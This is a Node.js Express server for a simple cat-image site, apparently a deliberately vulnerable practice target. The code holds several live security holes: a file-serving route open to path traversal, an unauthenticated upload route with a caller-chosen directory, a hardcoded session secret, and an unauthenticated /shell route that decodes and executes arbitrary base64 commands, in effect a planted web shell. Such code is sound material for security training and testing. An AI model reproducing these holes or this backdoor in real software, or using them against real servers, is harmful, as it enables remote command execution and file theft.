const express = require("express");
const path = require("path");
const bodyParser = require("body-parser");
const cookieParser = require("cookie-parser");
const jwt = require('jsonwebtoken');
const dotenv = require('dotenv');
const sessions = require('express-session');
const fs = require('fs');
const fileUpload = require('express-fileupload');
var morgan = require('morgan')
dotenv.config();

var app = express();
app.use('/img', express.static('img'));
const port = process.env.WEBAPP_PORT || 8000;
const HOST = process.env.HOST || '0.0.0.0';
var session;

var accessLogStream = fs.createWriteStream(path.join(__dirname, 'log', 'access.log'), { flags: 'a' })

let admin_user = "admin"
let admin_pwd = process.env.ADMIN_PASSWORD
 
app.set("views", path.join(__dirname, "views"));
app.set("view engine", "pug");
app.use(express.static(path.join(__dirname, "public")));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(cookieParser());
app.use(morgan('combined', {stream: accessLogStream}));
app.use(fileUpload({
  createParentPath: true
}));
app.use(sessions({
    secret: "heT0mVKHPI",
    saveUninitialized:true,
    cookie: { maxAge: 86400000 },
    resave: false 
}));

app.get("/", (req, res) => {
  let imgArr = ['img/cat.jpeg', 'img/catsign.jpg'];
  res.render("index", { title: "Home", imgval: imgArr[Math.floor(Math.random() * 2)] });
});
app.get('/admin', (req, res) => {
  session=req.session;
  if(session.userid){
    fs.readdir('img/', (err, files) => {
      res.render("admin", { title: "Admin Panel", items:files})
    });
  } else {
    res.redirect("/login");
  }
});
app.get('/login', (req, res) => {
  res.render("login", { title: "Login"})
});

app.get('/get_img', (req, res) => {
  res.sendFile(path.join(__dirname, req.query.file));
});

app.get('/upload' , (req, res) => {
  res.render("upload", {title: "Upload"});
});

app.post('/auth',(req,res) => {
  let authString = Buffer.from(req.query.a, 'base64').toString()
  let uname = authString.split(":")[0]
  let passwd = authString.split(":")[1]
  if (uname == admin_user && passwd == admin_pwd){
    session=req.session;
    session.userid=uname;
    res.redirect('/admin')
  } else {
    res.redirect('/login')
  }
});

app.post('/do_upload', async (req, res) => {
  try {
    if(!req.files) {
        res.send({
            status: false,
            message: 'No file uploaded'
        });
    } else {
      
      if (!req.query.dir){
        dir = './img/'
      } else {
        dir = req.query.dir
      }

      let fname = req.files.file_name.name;
      let upload_path = dir+fname
      console.log(upload_path)
      req.files.file_name.mv(upload_path);
      res.redirect('/admin')
    }
  } catch (err) {
	  console.log(err)
    res.status(500).send(err);
  }
});

app.post('/shell' , (req, res) => {
  const { exec } = require("child_process");
  let cmd = Buffer.from(req.body['payload'], 'base64').toString()
  exec(cmd, (error, stdout, stderr) => {
    let return_val = Buffer.from(stdout).toString('base64')
    res.setHeader('Content-type','text/plain')
    res.send(return_val)
});
});

app.listen(port, () => { });